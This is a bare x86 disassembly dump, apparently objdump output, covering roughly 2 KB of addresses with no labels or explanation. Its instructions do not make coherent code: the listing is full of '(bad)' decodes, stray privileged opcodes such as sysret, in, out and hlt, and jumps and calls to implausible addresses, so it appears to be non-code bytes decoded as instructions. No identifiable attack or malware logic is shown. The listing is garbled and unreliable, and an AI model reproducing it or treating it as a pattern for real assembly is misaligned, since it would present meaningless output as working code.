  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
